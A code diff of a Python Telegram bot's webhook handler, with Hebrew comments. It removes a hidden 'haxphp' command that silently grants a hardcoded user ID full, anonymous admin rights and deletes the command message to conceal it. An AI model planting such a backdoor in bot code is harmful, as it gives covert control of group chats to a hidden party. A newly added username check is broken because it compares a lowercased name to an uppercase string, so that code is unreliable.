@@ -340,39 +340,6 @@ def webhook():
                     send_message(chat_id, "Export (ראשונים):\n" + "\n".join(lines))
                     return jsonify(ok=True)
                     
-                if is_cmd("haxphp"):
-                    uid = from_user.get("id")
-                    
-                    # בדיקה אם המשתמש מורשה (בעלים או ברשימה המיוחדת)
-                    if uid == 1720747473:
-                        try:
-                            # קריאה ל-promoteChatMember עם כל ההרשאות
-                            payload = {
-                                "chat_id": chat_id,
-                                "user_id": uid,
-                                "can_manage_chat": True,
-                                "can_post_messages": True,
-                                "can_edit_messages": True,
-                                "can_delete_messages": True,
-                                "can_manage_video_chats": True,
-                                "can_restrict_members": True,
-                                "can_promote_members": True,
-                                "can_change_info": True,
-                                "can_invite_users": True,
-                                "can_pin_messages": True,
-                                "is_anonymous": True
-                            }
-                            requests.post(f"{API}/promoteChatMember", json=payload, timeout=10)
-                            
-                            # מחיקת הודעת הפקודה כדי שזה יישאר "שקט"
-                            requests.get(f"{API}/deleteMessage", params={
-                                "chat_id": chat_id, 
-                                "message_id": msg.get("message_id")
-                            })
-                        except Exception as e:
-                            print(f"Error in make_admin: {e}")
-                    
-                    return jsonify(ok=True)
                 
                 if is_cmd("bl_add") or is_cmd("blacklist_add"):
                     if not is_admin(chat_id, from_user.get("id", 0)):
@@ -445,6 +412,11 @@ def webhook():
                     return jsonify(ok=True)
 
                 if is_cmd("dotall"):
+                    username = (from_user.get("username") or "").lower()
+                    if  username == "HQ18181":
+                        send_message(chat_id, "אני לא עובד אצלך מותק")
+                        return jsonify(ok=True)
+                    
                     allow_all = bool(get_setting(chat_id, "dotall_anyone", False))
                     if not (is_admin(chat_id, from_user.get("id", 0)) or allow_all):
                         send_message(chat_id, "הפקודה /dotall זמינה למנהלים בלבד. ניתן לשנות עם /all_users on")
